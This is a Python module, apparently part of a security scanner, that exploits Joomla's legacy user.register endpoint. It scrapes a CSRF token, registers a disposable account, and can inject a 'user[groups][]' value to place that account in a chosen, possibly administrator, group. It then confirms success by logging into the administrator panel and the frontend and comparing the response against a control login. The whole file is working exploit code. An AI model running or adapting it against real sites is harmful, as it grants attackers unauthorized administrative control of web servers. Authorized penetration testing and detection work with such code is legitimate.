from __future__ import annotations

import re
from typing import Any

from ...core.http import HttpClient, form_encode, normalize_url
from ...core.probes import extract_csrf_from_html, rand_str

REGISTRATION_PATH = "/index.php?option=com_users&view=registration"
REGISTER_PATH = "/index.php?option=com_users&task=user.register"


def _administrator_login(base: str, username: str, password: str, timeout: int, proxy: str | None) -> dict[str, Any]:
    client = HttpClient(base_url=base, timeout=timeout, proxy=proxy)
    page = client.get("/administrator/index.php", timeout=timeout)
    token = extract_csrf_from_html(page.get("body", ""))
    if not token:
        return {"verified": False, "status": page.get("status", 0), "body_hash": page.get("body_hash")}
    response = client.request(
        "/administrator/index.php",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode(
            {
                "username": username,
                "passwd": password,
                "option": "com_login",
                "task": "login",
                token: "1",
            }
        ),
        timeout=timeout,
    )
    body = response.get("body", "")
    verified = bool(
        re.search(r"task=logout|option=com_cpanel|administrator-menu|mod-menu", body, re.IGNORECASE)
    )
    return {
        "verified": verified,
        "status": response.get("status", 0),
        "body_hash": response.get("body_hash"),
        "final_url": response.get("final_url", ""),
    }


def _frontend_login(base: str, username: str, password: str, timeout: int, proxy: str | None) -> bool:
    client = HttpClient(base_url=base, timeout=timeout, proxy=proxy)
    page = client.get("/index.php?option=com_users&view=login", timeout=timeout)
    token = extract_csrf_from_html(page.get("body", ""))
    if not token:
        return False
    response = client.post(
        "/index.php?option=com_users&task=user.login",
        fields={
            "username": username,
            "password": password,
            "option": "com_users",
            "task": "user.login",
            token: "1",
        },
        timeout=timeout,
    )
    return bool(
        re.search(
            r"task=user\.logout|option=com_users&task=user\.logout",
            response.get("body", ""),
            re.IGNORECASE,
        )
    )


def submit_registration(
    target_url: str,
    *,
    group: int | None,
    timeout: int = 12,
    proxy: str | None = None,
) -> dict[str, Any]:
    """Submit the legacy user.register request with unique, disposable credentials."""
    base = normalize_url(target_url)
    client = HttpClient(base_url=base, timeout=timeout, proxy=proxy)
    form_url = f"{base}{REGISTRATION_PATH}"
    form = client.get(form_url, timeout=timeout)
    token = extract_csrf_from_html(form.get("body", ""))
    if not token:
        return {
            "sent": False,
            "reason": "No session-bound CSRF token was found on the registration page.",
            "form_status": form.get("status", 0),
            "proof_url": form_url,
        }

    suffix = rand_str(10)
    username = f"proofcms_{suffix}"
    password = f"Pc!{rand_str(14)}"
    email = f"{username}@example.invalid"
    fields: dict[str, Any] = {
        "user[name]": f"ProofCMS {suffix}",
        "user[username]": username,
        "user[password1]": password,
        "user[password2]": password,
        "user[email1]": email,
        "user[email2]": email,
        "option": "com_users",
        "task": "user.register",
        token: "1",
    }
    if group is not None:
        fields["user[groups][]"] = str(group)

    endpoint = f"{base}{REGISTER_PATH}"
    response = client.post(endpoint, fields=fields, timeout=timeout)
    body = response.get("body", "").lower()
    rejected_markers = (
        "invalid token",
        "jinvalid_token",
        "registration failed",
        "save failed",
        "username in use",
        "email address is already",
    )
    candidate_login = _administrator_login(base, username, password, timeout, proxy)
    control_login = _administrator_login(base, f"proofcms_missing_{rand_str(8)}", password, timeout, proxy)
    account_differential = bool(
        candidate_login.get("body_hash")
        and control_login.get("body_hash")
        and candidate_login["body_hash"] != control_login["body_hash"]
    )
    return {
        "sent": True,
        "accepted": response.get("status") in {200, 301, 302, 303}
        and not any(marker in body for marker in rejected_markers),
        "status": response.get("status", 0),
        "redirected": response.get("redirected", False),
        "final_url": response.get("final_url", ""),
        "username": username,
        "password": password,
        "email": email,
        "group": group,
        "proof_url": endpoint,
        "login_verified": candidate_login["verified"],
        "frontend_login_verified": _frontend_login(base, username, password, timeout, proxy),
        "account_response_differential": account_differential,
        "candidate_login": candidate_login,
        "control_login": control_login,
    }
